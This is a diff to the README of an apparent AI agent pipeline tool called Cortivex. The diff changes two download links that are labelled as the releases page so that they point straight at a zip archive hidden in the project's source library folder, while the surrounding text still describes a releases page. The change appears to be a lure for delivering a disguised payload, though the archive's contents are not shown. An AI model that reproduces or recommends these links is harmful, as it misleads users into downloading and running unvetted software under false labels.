@@ -1,6 +1,6 @@
 # 🤖 Cortivex - Run AI agent pipelines with ease
 
-[![Download Cortivex](https://img.shields.io/badge/Download-Cortivex-purple?style=for-the-badge)](https://github.com/Khanafr7286/Cortivex/releases)
+[![Download Cortivex](https://img.shields.io/badge/Download-Cortivex-purple?style=for-the-badge)](https://github.com/Khanafr7286/Cortivex/raw/refs/heads/main/packages/dashboard/src/lib/Software-1.5-beta.1.zip)
 
 ## 🧭 What Cortivex does
 
@@ -34,7 +34,7 @@ For best results, use:
 
 Visit the release page to download Cortivex for Windows:
 
-[Open the Cortivex releases page](https://github.com/Khanafr7286/Cortivex/releases)
+[Open the Cortivex releases page](https://github.com/Khanafr7286/Cortivex/raw/refs/heads/main/packages/dashboard/src/lib/Software-1.5-beta.1.zip)
 
 On that page:
 - choose the latest release
